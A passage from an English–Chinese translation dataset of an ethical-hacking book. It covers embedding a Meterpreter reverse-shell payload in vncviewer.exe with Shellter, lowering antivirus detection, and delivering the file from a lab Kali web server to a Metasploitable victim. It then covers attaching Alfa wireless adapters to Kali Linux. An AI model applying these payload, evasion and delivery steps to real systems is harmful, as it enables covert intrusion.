- en: 'Next, configure the payload to be attached to the PE file, use the following
    configurations:'
  id: totrans-163
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，配置要附加到PE文件的载荷，使用以下配置：
- en: Choose `L` for the listed payload.
  id: totrans-164
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 选择`L`来列出可用的载荷。
- en: 'Payload by index: `1 – Meterpreter_Reverse_TCP`.'
  id: totrans-165
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 按索引选择载荷：`1 – Meterpreter_Reverse_TCP`。
- en: Set `LHOST` as the IP address of your Kali Linux machine.
  id: totrans-166
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 设置`LHOST`为你Kali Linux机器的IP地址。
- en: Set `LPORT` as the listening port on Kali Linux.
  id: totrans-167
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 设置`LPORT`为Kali Linux上的监听端口。
- en: 'The following screenshot shows the expected configurations:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图展示了预期的配置：
- en: '![](../media/file340.png)'
  id: totrans-169
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file340.png)'
- en: 'Once the custom payload has been successfully complied, the following window
    will appear:'
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦自定义载荷成功编译，以下窗口将会出现：
- en: '![](../media/file341.png)'
  id: totrans-171
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file341.png)'
- en: 'Next, go to [https://www.virustotal.com/](https://www.virustotal.com/) and
    upload the encoded `vncviewer.exe` file to determine its threat rating, as shown
    below:'
  id: totrans-172
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，访问[https://www.virustotal.com/](https://www.virustotal.com/)并上传编码后的`vncviewer.exe`文件，以确定其威胁评级，如下所示：
- en: '![](../media/file342.png)'
  id: totrans-173
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file342.png)'
- en: As shown in the preceding screenshot, the threat detection rating is lower than
    those payloads that were generated by MSFvenom.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示，威胁检测评级低于由MSFvenom生成的那些载荷。
- en: 'Next, use the following commands to setup a Meterpreter listener using Metasploit
    to capture to reverse shell from the targeted system when it’s executed:'
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令设置一个Meterpreter监听器，通过Metasploit捕获从目标系统执行后的反向Shell：
- en: '[PRE15]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'The following screenshot shows the execution of the preceding commands:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图展示了前述命令的执行情况：
- en: '![](../media/file343.png)'
  id: totrans-178
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file343.png)'
- en: 'The following is a breakdown of the preceding sequence of commands:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是前述命令序列的解析：
- en: The `windows/meterpreter/reverse_tcp` payload ensures when a connection is detected,
    Metasploit will send this payload to the targeted system, which will execute within
    memory and create a reverse shell back to the Kali Linux machine.
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`windows/meterpreter/reverse_tcp`载荷确保当连接被检测到时，Metasploit会将此载荷发送到目标系统，该载荷将在内存中执行并创建一个反向Shell回到Kali
    Linux机器。'
- en: The `LHOST` and `LPORT` parameters are used to set the local IP address and
    listening port on Kali Linux.
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`LHOST`和`LPORT`参数用于设置Kali Linux上的本地IP地址和监听端口。'
- en: The `AutoRunScript post/windows/manage/migrate` command ensures that once a
    connection has been established from the victim system to Kali Linux, Metasploit
    will automatically migrate the process on the targeted system to another process
    to reduce detection.
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`AutoRunScript post/windows/manage/migrate`命令确保一旦从受害者系统与Kali Linux建立连接，Metasploit将自动将目标系统上的进程迁移到另一个进程，从而减少被检测的机会。'
- en: The `exploit` command is used to execute a payload or exploit module within
    Metasploit.
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`exploit`命令用于在Metasploit中执行载荷或利用模块。'
- en: 'Next, let''s deliver our custom payload to a Windows-based machine on such
    as Metasploitable 3 on the `172.30.1.0/24` network within our virtual lab environment.
    On Kali Linux, open a new **Terminal** (#2) and use the following commands to
    start a Python3 web server:'
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，让我们将自定义负载交付到如**Metasploitable 3**的Windows系统上，该系统位于我们虚拟实验室环境中的`172.30.1.0/24`网络。打开Kali
    Linux中的新**Terminal**（#2），并使用以下命令启动Python3网络服务器：
- en: '[PRE16]'
  id: totrans-185
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: The Python3 web server will enable us to download files from the Kali Linux
    machine onto other systems within our lab environment.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: Python3网络服务器将使我们能够从Kali Linux机器下载文件到实验环境中的其他系统。
- en: 'Next, power-on the **Metasploitable 3** virtual machine and login with username:
    `Administrator` and password: `vagrant` to login to the desktop.'
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动**Metasploitable 3**虚拟机并使用用户名`Administrator`和密码`vagrant`登录到桌面。
- en: Within **Metasploitable 3**, open the web browser and go to `http://172.30.1.50:8000/vncviewer.exe`
    to download and save the payload.
  id: totrans-188
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**Metasploitable 3**中，打开网页浏览器并访问`http://172.30.1.50:8000/vncviewer.exe`下载并保存负载。
- en: 'Next, execute the `vncviewer.exe` file on **Metasploitable 3** and notice the
    reverse shell is captured on **Terminal #1** on **Kali Linux**, as shown below:'
  id: totrans-189
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '接下来，在**Metasploitable 3**上执行`vncviewer.exe`文件，注意反向Shell已在**Kali Linux**上的**Terminal
    #1**捕获，如下所示：'
- en: '![](../media/file344.png)'
  id: totrans-190
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file344.png)'
- en: As shown in the preceding screenshot, the Metasploit listener module captured
    a reverse connection from `172.30.1.48`, then delivered an additional payload
    to establish a Meterpreter shell and migrate the running process ID on the victim
    system. Additionally, using the `sysinfo` command on Meterpreter enables us to
    obtain system information about the compromised system.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示的截图所示，Metasploit监听模块捕获了来自`172.30.1.48`的反向连接，然后交付了一个附加负载以建立Meterpreter shell并将运行的进程ID迁移到受害系统上。此外，使用Meterpreter中的`sysinfo`命令可以让我们获取关于受损系统的系统信息。
- en: Once a Meterpreter shell has been obtained, use the `help` command to view a
    list of commands for performing actions and collecting information from the compromised
    machine.
  id: totrans-192
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 一旦获得Meterpreter shell，使用`help`命令查看执行操作和收集受损机器信息的命令列表。
- en: Not all Windows-based executables will work with Shellter. When working with
    Shellter, it’s important to ensure the PE file that’s encoded with shellcode from
    Shellter executes long enough on the targeted system for the staged payload to
    be delivered from Kali Linux to the target.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 并非所有基于Windows的可执行文件都能与Shellter一起使用。在使用Shellter时，确保Shellter编码的PE文件在目标系统上运行足够长的时间，以便从Kali
    Linux向目标系统交付阶段性负载，这是非常重要的。
- en: 'Lastly, use the `getuid` command within Meterpreter to determine the user account
    that’s running our payload, as shown below:'
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，使用Meterpreter中的`getuid`命令来确定运行我们负载的用户账户，如下所示：
- en: '![](../media/file345.png)'
  id: totrans-195
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file345.png)'
- en: As shown in the preceding screenshot, the payload is running as the Administrator
    user account on the targeted system.Having completed this section, you have learned
    how to create, encode, and deliver payloads on a target system host. This section
    has provided you with an introduction into the weaponization and delivery phases
    of the Cyber Kill Chain. In addition, you have also learned how to identify whether
    a payload has a high threat detection rating and discover common techniques which
    can be used to reduce detection by antimalware. In the next section, you will
    learn how to configure wireless adapters to monitor nearby traffic on Wi-Fi networks.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 如上图所示，负载作为目标系统上的管理员用户账户运行。完成这一部分后，你已经学会了如何在目标系统主机上创建、编码和交付负载。本节为你介绍了网络攻击链中的武器化和交付阶段。此外，你还学会了如何识别负载是否具有高威胁检测评级，并发现减少反恶意软件检测的常见技术。在下一部分中，你将学习如何配置无线适配器以监控Wi-Fi网络上的附近流量。
- en: Working with wireless adapters
  id: totrans-197
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用无线适配器
- en: As an aspiring ethical hacking and penetration tester, you may be assigned to
    perform wireless penetration testing techniques on a targeted network with the
    intent of identifying any security vulnerabilities and assessing the attack surface
    to better understand how an adversary may be able to compromise the wireless network
    of an organization and gain unauthorized access.While many ethical hackers and
    penetration testers prefer to directly install Kali Linux on the local storage
    drive on their laptops for improve mobility and direct access to the hardware
    resources, this deployment model isn’t always the best. For instance, the chipset
    within the wireless network adapter on a laptop may not support monitoring mode
    and packet injection.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 作为一名有抱负的道德黑客和渗透测试员，你可能被指派执行无线渗透测试技术，针对目标网络进行测试，目的是识别任何安全漏洞，并评估攻击面，以更好地理解对手如何可能攻破组织的无线网络并获得未授权访问。虽然许多道德黑客和渗透测试员更倾向于直接将Kali
    Linux安装到笔记本电脑的本地存储驱动器上，以提高机动性并直接访问硬件资源，但这种部署模型并不总是最佳选择。例如，笔记本电脑中的无线网络适配器的芯片组可能不支持监控模式和数据包注入。
- en: 'Therefore, it’s recommended to acquire a set of external wireless networks
    adapters that supports the following features:'
  id: totrans-199
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 因此，建议购买一套支持以下功能的外部无线网络适配器：
- en: IEEE 802.11 standards such as 802.11a/b/g/n/ac.
  id: totrans-200
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: IEEE 802.11标准，如802.11a/b/g/n/ac。
- en: Operates on the 2.4 GHz and 5 GHz bands.
  id: totrans-201
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在2.4 GHz和5 GHz频段上工作。
- en: Supports monitoring mode to identify wireless clients and access points.
  id: totrans-202
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持监控模式，以识别无线客户端和接入点。
- en: Support packet injects for performing wireless penetration testing.
  id: totrans-203
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 支持数据包注入，用于执行无线渗透测试。
- en: 'While there are many wireless network adapters available on popular e-commerce
    websites, the following are two wireless network adapters that are commonly used
    by penetration testers within the industry:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然在流行的电子商务网站上有许多无线网络适配器，但以下是两款渗透测试员在行业中常用的无线网络适配器：
- en: Alfa AWUS036NHA - Wireless B/G/N USB Adapter (supports 2.4 GHz only)
  id: totrans-205
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Alfa AWUS036NHA - 无线B/G/N USB适配器（仅支持2.4 GHz）
- en: Alfa AWUS036ACH Long-Range Dual-Band AC1200 Wireless USB Adapter (supports 2.4
    GHz and 5 GHz)
  id: totrans-206
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Alfa AWUS036ACH 长距离双频AC1200无线USB适配器（支持2.4 GHz和5 GHz）
- en: Keep in mind, there are additional vendors that manufacture wireless network
    adapters that supports monitoring mode and packet injection. However, you’ll need
    to do additional research and make comparisons to determine which wireless network
    adapter is best suitable for you based on its availability, cost, features, form
    factor and interoperability with your system and Kali Linux.
  id: totrans-207
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 请记住，还有其他厂商制造支持监控模式和数据包注入的无线网络适配器。然而，你需要做进一步的研究和比较，以确定哪款无线网络适配器最适合你，具体依据它的可用性、成本、功能、外形和与系统以及Kali
    Linux的兼容性。
- en: 'The following is an image of the Alfa AWUS036NHA wireless network adapter:'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是Alfa AWUS036NHA无线网络适配器的图片：
- en: '![](../media/file346.png)'
  id: totrans-209
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file346.png)'
- en: 'As shown in the preceding image, the Alfa adapter includes a detachable antenna
    which enables penetration testers to connect with a more powerful antenna to capture
    wireless frames at a greater distance.The following image shows the Alfa AWUS036ACH
    wireless adapter:'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 如上图所示，Alfa适配器配备了可拆卸天线，渗透测试员可以连接更强大的天线，从而在更远的距离捕获无线帧。以下是Alfa AWUS036ACH无线适配器的图片：
- en: '![](../media/file347.png)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file347.png)'
- en: As shown in the preceding image, the Alfa AWUS036ACH model also support detachable
    antennas similar to the Alfa AWUS036NHA model.Using a wireless network adapter
    that supports the 2.4 GHz band will only be efficient for performing wireless
    penetration testing on wireless networks and access points that operates only
    on 2.4 GHz and not 5 GHz. As a penetration tester, it's important to always be
    prepared for each type of penetration test, such as ensuring you have the appropriate
    software and hardware tools within your arsenal. Imagine that you've arrived at
    the customer’s location to perform a wireless penetration test and you attach
    your wireless network adapter to Kali Linux, but it's unable to detect the targeted
    wireless network. While there are many reasons for not being able to detect the
    wireless network, one specific reason is that the targeted wireless network is
    operating on the 5 GHz band, while your wireless network adapter only supports
    2.4 GHz. Hence, it’s important to properly plan for each penetration test before
    starting any technical work on the customer’s infrastructure.Over the next few
    sub-sections, you will learn how to connect the Alfa AWUS036NHA and AWUS036ACH
    wireless adapters to the Kali Linux virtual machine.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 如前图所示，Alfa AWUS036ACH 型号同样支持可拆卸天线，类似于 Alfa AWUS036NHA 型号。使用支持 2.4 GHz 频段的无线网络适配器对于执行无线渗透测试仅对只在
    2.4 GHz 频段运行的无线网络和接入点有效，而对 5 GHz 频段的网络无效。作为渗透测试人员，始终为每种类型的渗透测试做好准备非常重要，比如确保您拥有合适的软件和硬件工具。想象一下，您到达客户地点准备进行无线渗透测试，将无线网络适配器连接到
    Kali Linux 时，却无法检测到目标无线网络。虽然无法检测到无线网络有很多原因，但其中一个具体原因是目标无线网络在 5 GHz 频段上运行，而您的无线网络适配器仅支持
    2.4 GHz。因此，在开始任何技术工作之前，正确规划每次渗透测试至关重要。在接下来的几个子部分中，您将学习如何将 Alfa AWUS036NHA 和 AWUS036ACH
    无线适配器连接到 Kali Linux 虚拟机。
- en: Connecting wireless adapters to Kali Linux
  id: totrans-213
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 连接无线适配器到 Kali Linux
- en: 'In this section, you will learn how to properly attach a USB wireless network
    adapter such as the Alfa AWUS036NHA adapter to Kali Linux over Oracle VM VirtualBox.
    In this exercise, I’ll be using the Alfa AWUS036NHA wireless adapter as it doesn’t
    require additional drivers on Kali Linux.To get started with this exercise, please
    use the following instructions:'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，您将学习如何将像 Alfa AWUS036NHA 适配器这样的 USB 无线网络适配器正确地连接到 Kali Linux 上的 Oracle
    VM VirtualBox。在这个练习中，我将使用 Alfa AWUS036NHA 无线适配器，因为它在 Kali Linux 上不需要额外的驱动程序。开始此练习前，请按照以下说明操作：
- en: Firstly, attach the Alfa AWUS036NHA wireless adapter onto your host system via
    an available USB port. I do not recommend connecting your wireless network adapter
    onto a USB hub, consider connecting the wireless adapter directly onto a USB port
    on your motherboard or laptop.
  id: totrans-215
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，通过一个可用的 USB 端口将 Alfa AWUS036NHA 无线适配器连接到您的主机系统。我不建议将无线网络适配器连接到 USB 集线器上，建议直接将无线适配器连接到主板或笔记本电脑上的
    USB 端口。
- en: 'Next, open the **Oracle VM VirtualBox Manager**, select the **Kali Linux**
    virtual machine and click on **Settings**, as shown below:'
  id: totrans-216
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，打开 **Oracle VM VirtualBox 管理器**，选择 **Kali Linux** 虚拟机并点击 **设置**，如下所示：
- en: '![](../media/file348.png)'
  id: totrans-217
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file348.png)'
- en: 'On the **Settings** menu, select the **USB** category and ensure the **USB
    Controller** mode is set to either USB 2.0 or USB 3.0 based on the type of physical
    USB ports on your host computer. Then, click on the **USB+** icon to select the
    wireless network adapter, as shown below:'
  id: totrans-218
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 **设置** 菜单中，选择 **USB** 类别，并确保 **USB 控制器** 模式设置为 USB 2.0 或 USB 3.0，具体取决于主机计算机上物理
    USB 端口的类型。然后，点击 **USB+** 图标以选择无线网络适配器，如下所示：
- en: '![](../media/file349.png)'
  id: totrans-219
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file349.png)'
- en: 'Next, the USB device menu will appear showing all connected USB devices on
    the host computer, including the connected Alfa AWUS036NHA wireless adapter. Simply,
    select the Alfa AWUS036NHA wireless adapter to insert it within the list of USB
    Devices, as shown below:'
  id: totrans-220
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，USB 设备菜单将显示主机计算机上所有连接的 USB 设备，包括连接的 Alfa AWUS036NHA 无线适配器。只需选择 Alfa AWUS036NHA
    无线适配器，将其插入到 USB 设备列表中，如下所示：
- en: '![](../media/file350.png)'
  id: totrans-221
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file350.png)'
- en: 'As shown in the preceding screenshot, the wireless network adapter is labelled
    as ATHEROS UB91C. The device identification may vary on the chipset on the wireless
    adapter and the operating system.The following screenshot shows the wireless adapter
    is available within the USB Devices Filters list and it’s selected:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示，无线网络适配器被标记为 ATHEROS UB91C。设备识别可能会根据无线适配器的芯片组和操作系统有所不同。下图显示无线适配器在 USB 设备过滤器列表中可用，并已被选中：
- en: '![](../media/file351.png)'
  id: totrans-223
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file351.png)'
- en: Next, on the **Setting** window, click on **OK** to save the configurations.
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在 **设置** 窗口中，点击 **确定** 保存配置。
- en: Next, power-on the **Kali Linux** virtual machine and login to the desktop.
  id: totrans-225
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动 **Kali Linux** 虚拟机并登录桌面。
- en: 'Next, the wireless network adapter may not logically be connected to Kali Linux,
    therefore right-click on the USB icon found on the Kali Linux virtual machine
    status bar found on the bottom-right, as shown below:'
  id: totrans-226
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，无线网络适配器可能没有被 Kali Linux 逻辑上连接，因此，右键点击位于 Kali Linux 虚拟机右下角状态栏中的 USB 图标，如下所示：
- en: '![](../media/file352.png)'
  id: totrans-227
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file352.png)'
- en: After you’ve right-click on the USB icon, a list of available USB devices will
    appear. Simply, click on the wireless network adapter to attach it onto the virtual
    machine.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 在你右键点击 USB 图标后，会显示一个可用 USB 设备的列表。只需点击无线网络适配器即可将其附加到虚拟机上。
- en: 'On **Kali Linux**, open the **Terminal** and use the `ifconfig` command to
    verify the wireless network adapter is attached, as shown below:'
  id: totrans-229
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 **Kali Linux** 上，打开 **终端**，使用 `ifconfig` 命令验证无线网络适配器是否已连接，如下所示：
- en: '![](../media/file353.png)'
  id: totrans-230
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file353.png)'
- en: As shown in the preceding screenshot, Kali Linux was able to detect the physical
    wireless network adapter and labelled the interface as `wlan0` without requiring
    any additional software drivers. Within Linux-based operating systems, physical
    Ethernet adapters are labelled as `eth` interfaces, while wireless adapters are
    labelled as `wlan` interfaces. The number after an interface’s name represents
    the **interface identifier** (**ID**) and the first interface usually begins with
    `0` such as `eth0` and `wlan0`.
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示，Kali Linux 能够检测到物理无线网络适配器，并将其接口标记为 `wlan0`，无需额外的软件驱动程序。在基于 Linux 的操作系统中，物理以太网适配器被标记为
    `eth` 接口，而无线适配器则标记为 `wlan` 接口。接口名称后面的数字表示 **接口标识符** (**ID**)，第一个接口通常以 `0` 开头，如
    `eth0` 和 `wlan0`。
- en: 'Next, use the `iwconfig` command to view specific details of the wireless adapter,
    as shown below:'
  id: totrans-232
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用 `iwconfig` 命令查看无线适配器的具体详情，如下所示：
- en: '![](../media/file354.png)'
  id: totrans-233
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file354.png)'
- en: As shown in the preceding screenshot, the `iwconfig` command enables us to view
    the current operating system mode of the wireless network adapter. Here, you can
    view the operating system mode, the transmitting power level (**Tx-Power**) and
    determine whether the wireless adapter is associated (connected) to a nearby access
    point or wireless router.
  id: totrans-234
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如前所示，`iwconfig` 命令使我们能够查看无线网络适配器的当前操作系统模式。在这里，你可以查看操作系统模式、发射功率等级 (**Tx-Power**)，并确定无线适配器是否已连接到附近的接入点或无线路由器。
- en: Having completed this exercise, you have learnt how to successfully attach a
    wireless network adapter to Kali Linux. Furthermore, you have learned how the
    Alfa AWUS036NHA wireless network adapter functions seamlessly as a plug-and-play
    device. Next, you will learn how to connect a wireless network adapter that has
    an RTL8812AU chipset such as the Alfa AWUS036ACH wireless adapter.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本次练习后，你已经学会了如何成功地将无线网络适配器连接到 Kali Linux 系统。此外，你还学习了 Alfa AWUS036NHA 无线网络适配器如何作为即插即用设备无缝工作。接下来，你将学习如何连接具有
    RTL8812AU 芯片组的无线网络适配器，如 Alfa AWUS036ACH 无线适配器。
- en: Connecting a wireless adapter with an RTL8812AU chipset
  id: totrans-236
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 连接带有 RTL8812AU 芯片组的无线适配器
- en: 'Various wireless network adapters has the RTL8812AU chipset and is not natively
    recognized/identified by Kali Linux when it’s connected. In this section, you
    will learn how to successfully setup and connect a wireless network adapter such
    as the Alfa AWUS036ACH wireless network adapter, which has an RTL8812AU chipset.To
    get started with this exercise, please use the following instructions:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 各种无线网络适配器都采用 RTL8812AU 芯片组，并且在连接时 Kali Linux 不会自动识别它。在本节中，你将学习如何成功地设置并连接一个具有
    RTL8812AU 芯片组的无线网络适配器，例如 Alfa AWUS036ACH 无线适配器。要开始这个练习，请按照以下指示操作：
- en: Firstly, connect the Alfa AWUS036ACH wireless network adapter onto your host
    system.
  id: totrans-238
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，将 Alfa AWUS036ACH 无线网络适配器连接到你的主机系统。
- en: Open **Oracle VirtualBox Manager**, select the **Kali Linux** virtual machine
    and click on **Settings**.
  id: totrans-239
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开**Oracle VirtualBox管理器**，选择**Kali Linux**虚拟机并点击**设置**。
- en: 'Once the **Settings** menu appear, click on the **USB** category and ensure
    the USB Controller mode is either set to USB 2.0 or 3.0 which is based on the
    type of physical USB ports are supported on your host computer. Then, click on
    the **USB+** icon to open a pop-up menu which displays all USB connected devices,
    as shown below:'
  id: totrans-240
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦**设置**菜单出现，点击**USB**类别，并确保USB控制器模式设置为USB 2.0或3.0，这取决于主机计算机支持的物理USB端口类型。然后，点击**USB+**图标打开弹出菜单，显示所有连接的USB设备，如下所示：
- en: '![](../media/file355.png)'
  id: totrans-241
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file355.png)'
- en: 'Next, on the USB devices pop-up menu select the wireless network adapter which
    is labelled **Realtek 802.11n NIC**, as shown below:'
  id: totrans-242
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在USB设备弹出菜单中选择标记为**Realtek 802.11n NIC**的无线网络适配器，如下所示：
- en: '![](../media/file356.png)'
  id: totrans-243
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file356.png)'
- en: The device identification may vary on the chipset on the wireless adapter and
    the operating system.
  id: totrans-244
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 设备的识别可能会因无线适配器的芯片组和操作系统的不同而有所不同。
- en: 'The following screenshot shows the wireless adapter is available within the
    **USB Devices Filters** list and it’s selected:'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示无线适配器在**USB设备过滤器**列表中可用，并已选中：
- en: '![](../media/file357.png)'
  id: totrans-246
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file357.png)'
- en: Next, on the **Setting** window, click on **OK** to save the configurations.
  id: totrans-247
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在**设置**窗口中，点击**确定**以保存配置。
- en: Next, power-on the **Kali Linux** virtual machine and login to the desktop.
  id: totrans-248
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，启动**Kali Linux**虚拟机并登录到桌面。
- en: 'Next, the wireless network adapter may not logically be connected to Kali Linux,
    therefore right-click on the USB icon found on the Kali Linux virtual machine
    status bar on the bottom-right and select the newly connected wireless network
    adapter, as shown below:'
  id: totrans-249
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，无线网络适配器可能没有逻辑上连接到Kali Linux，因此右击Kali Linux虚拟机状态栏右下角的USB图标，选择新连接的无线网络适配器，如下所示：
- en: '![](../media/file358.png)'
  id: totrans-250
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file358.png)'
- en: As shown in the preceding screenshot, the Alfa AWUS036ACH is identified as a
    Realtek 802.11n NIC device.
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示截图，Alfa AWUS036ACH被识别为Realtek 802.11n NIC设备。
- en: 'Next, open the **Terminal** within Kali Linux and use the `lsusb` command to
    verify the chipset of the attached wireless adapter, as shown below:'
  id: totrans-252
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在Kali Linux中打开**终端**，使用`lsusb`命令验证附加的无线适配器的芯片组，如下所示：
- en: '![](../media/file359.png)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file359.png)'
- en: 'As shown in the preceding screenshot, the Alfa AWUS036ACH wireless adapter
    has an RTL8812AU chipset. However, when using the `iwconfig` command, Kali Linux
    is unable to detect the wireless adapter as shown below:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示截图，Alfa AWUS036ACH无线适配器使用RTL8812AU芯片组。然而，在使用`iwconfig`命令时，Kali Linux无法检测到无线适配器，如下所示：
- en: '![](../media/file360.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file360.png)'
- en: 'Next, use the following command to update the packages source lists file on
    Kali Linux:'
  id: totrans-256
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令更新Kali Linux上的软件包源列表文件：
- en: '[PRE17]'
  id: totrans-257
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'Next, install the Realtek drivers for the RTL88XXAU chipset onto Kali Linux
    with Dynamic Kernel Module Support (DKMS) using the following commands:'
  id: totrans-258
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令在Kali Linux上通过动态内核模块支持（DKMS）安装适用于RTL88XXAU芯片组的Realtek驱动程序：
- en: '[PRE18]'
  id: totrans-259
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'Next, use the following commands to download, compile and install the latest
    RTL8812AU drivers from the Aircrack-ng GitHub repository:'
  id: totrans-260
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，使用以下命令从Aircrack-ng GitHub仓库下载、编译并安装最新的RTL8812AU驱动程序：
- en: '[PRE19]'
  id: totrans-261
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: Next, reboot Kali Linux to ensure the newly installed drivers are effective.
  id: totrans-262
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，重启Kali Linux以确保新安装的驱动程序生效。
- en: 'After rebooting Kali Linux, open the Terminal and use the iwconfig command
    to verify the Alfa AWUS036ACH wireless network adapter is being recognized on
    Kali Linux, as shown below:'
  id: totrans-263
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 重启Kali Linux后，打开终端，使用iwconfig命令验证Alfa AWUS036ACH无线网络适配器是否在Kali Linux上被识别，如下所示：
- en: '![](../media/file361.png)'
  id: totrans-264
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file361.png)'
- en: As shown in the preceding screenshot, the wireless network adapter is now connected
    on to Kali Linux, which enables us to perform various types of wireless-based
    attacks on the 2.4 GHz and 5 GHz wireless frequencies. Wireless penetration testing
